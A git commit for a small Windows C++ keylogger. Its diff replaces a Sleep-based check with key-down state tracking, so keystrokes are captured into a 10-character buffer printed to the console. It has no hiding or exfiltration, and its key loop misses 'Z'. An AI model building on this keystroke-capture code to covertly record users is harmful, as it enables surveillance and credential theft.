d08f1bd0df85113b186cb4139af08b970e1fb064
Noga Levy <nogalevy17@gmail.com>
2026-08-06 17:51:34 -0700

    Updated keylogger with a better algorithm
    Rather than just checking if a key was pressed down, now the program must also check if it's been pressed down--or, in other words, if the user hasn't released the key yet. This avoids the issue of both Sleep(100) and ignoring the key if it was the same as the last recorded key (this would cause issues for words like HELLO, turning it into HELO).

--- keylogger.cpp
+++ keylogger.cpp
@@ -2,32 +2,50 @@
 #include <vector>
 #include <string>
 #include <windows.h>
+#include <unordered_map>
 
+// Variable set up
 std::string key_history = " ";
+std::unordered_map<int, int> was_key_down;
 
 
 int main(){
+    // Initizializing unordered map
+    int index_count = 0;
+    for (int key = 0x20; key < 0x5A; key++){
+        was_key_down[key] = false;
+    }
+    
+    // Key-logging loop
     while (true){
         if (GetAsyncKeyState(VK_ESCAPE) & 0x8000){
             std::cout << "Ending Program" << std::endl;
             std::cout << key_history << std::endl;
             return 0;
         } else {
+            // Running through all the keys
             for (int key = 0x20; key < 0x5A; key++){
+                // Checking if this key should be logged
+                if (GetAsyncKeyState(key) & 0x8000){ // Is it pressed? [Yes to continue]
+                    if (was_key_down[key] == false){ // Has the user been keeping it pressed? [No to continue]
+                        // Update the map
+                        was_key_down[key] = true;
+                        
+                        // Log the key
+                        char helper_c = static_cast<char>(key);
+                        std::string c = std::string(1, helper_c);
+                        int str_length = key_history.length();
 
-                if (GetAsyncKeyState(key) & 0x8000){
-                    Sleep(100);
-                    char helper_c = static_cast<char>(key);
-                    std::string c = std::string(1, helper_c);
-                    int str_length = key_history.length();
-
-                    if (str_length == 10){
-                        key_history = key_history.substr(1, str_length - 1);
-                        key_history = key_history + c;
-                    } else {
-                        key_history = key_history + c;
+                        if (str_length == 10){
+                            key_history = key_history.substr(1, str_length - 1);
+                            key_history = key_history + c;
+                        } else {
+                            key_history = key_history + c;
+                        }
+                        std::cout << key_history << std::endl;
                     }
-                    std::cout << key_history << std::endl;
+                } else {
+                    was_key_down[key] = false;
                 }
             }
         }
